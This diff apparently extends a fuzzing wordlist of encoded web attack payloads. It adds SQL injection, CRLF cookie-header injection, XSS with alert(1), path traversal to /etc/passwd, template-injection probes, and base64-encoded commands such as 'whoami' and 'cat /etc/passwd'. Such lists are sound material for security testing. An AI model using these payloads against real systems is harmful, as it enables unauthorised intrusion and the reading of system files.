@@ -1,4 +1,45 @@
+''
+' oR '1'='1'--
+%0aSet-Cookie%3a%20foo%3dbar
+%0d%0aSet-Cookie%3a%20foo%3dbar
+%23%0aSet-Cookie%3a%20foo%3dbar
+%2527%2527
+%2527+oR+%25271%2527%253d%25271%2527--
 %252e%252e%252f
+%253cscript%253ealert%25281%2529%253c%252fscript%253e
+%27%27
+%27+oR+%271%27%3d%271%27--
 %2e%2e%2f
-\u002e\u002e\u002f
+%3b%0aSet-Cookie%3a%20foo%3dbar
+%3cscript%3ealert%281%29%3c%2fscript%3e
+%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+%u003cscript%u003ealert(1)%u003c/script%u003e
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
+&#60;script&#62;alert(1)&#60;/script&#62;
 &#x2e;&#x2e;&#x2f;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+&lt;script&gt;alert(1)&lt;/script&gt;
+..%c0%afetc%c0%afpasswd
+..%c1%9cetc%c1%9cpasswd
+..%ef%bc%8fetc%ef%bc%8fpasswd
+../../../etc/passwd%00
+../../etc/passwd%2500
+;;
+\j\a\v\a\s\c\r\i\p\t\:alert(1)
+\u002e\u002e\u002f
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+``
+{{7*7}}${7*7}<%=7*7%>
+<img src="x`onerror`=alert(1)">
+<img src=x &#111;nerror=alert(1)>
+<img src=x onerror&#61;alert(1)>
+<img src=x onerror&#x3D;alert(1)>
+aWQ=
+d2hvYW1p
+javascript%3aalert(1)
+javascript&#058;alert(1)
+jaVasCript:alert(1)
+PD9waHAgcGhwaW5mbygpOz8+
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+Y2F0IC9ldGMvcGFzc3dk
